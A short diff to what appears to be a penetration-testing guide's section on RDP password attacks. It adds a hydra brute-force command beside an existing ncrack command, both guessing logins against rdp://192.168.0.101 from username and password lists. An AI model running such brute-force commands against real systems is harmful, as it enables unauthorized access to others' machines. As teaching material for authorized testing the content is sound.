@@ -112,5 +112,6 @@ For RDP we can use Ncrack.
 
 ```text
 ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
+hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.101
 ```
 
